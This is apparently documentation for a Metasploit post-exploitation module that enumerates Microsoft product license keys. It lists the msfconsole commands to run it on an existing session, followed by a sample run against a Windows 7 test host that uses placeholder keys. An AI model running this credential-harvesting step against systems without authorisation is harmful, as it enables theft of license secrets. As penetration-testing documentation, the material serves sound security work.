## Vulnerable Application

This module will enumerate Microsoft product license keys.

## Verification Steps

1. Start msfconsole
2. Get a session
3. Do: `use post/windows/gather/enum_ms_product_keys`
4. Do: `set SESSION <session id>`
5. Do: `run`

## Options

## Scenarios

### Windows 7 Professional SP1 (x64)

```
msf6 > use post/windows/gather/enum_ms_product_keys
msf6 post(windows/gather/enum_ms_product_keys) > set session 1
session => 1
msf6 post(windows/gather/enum_ms_product_keys) > run

[*] Finding Microsoft product keys on TEST (192.168.200.190)

Keys
====

 Product                 Registered Owner  Registered Organization  License Key
 -------                 ----------------  -----------------------  -----------
 Windows 7 Professional  Windows User                               N0TMY-K3Y55-N0TMY-K3Y55-N0TMY
 Windows 7 Professional  Windows User                               N0TMY-K3Y55-N0TMY-K3Y55-N0TMY


[+] Product keys stored in: /root/.msf4/loot/20220814092725_default_192.168.200.190_host.ms_keys_579592.txt
[*] Post module execution completed
```
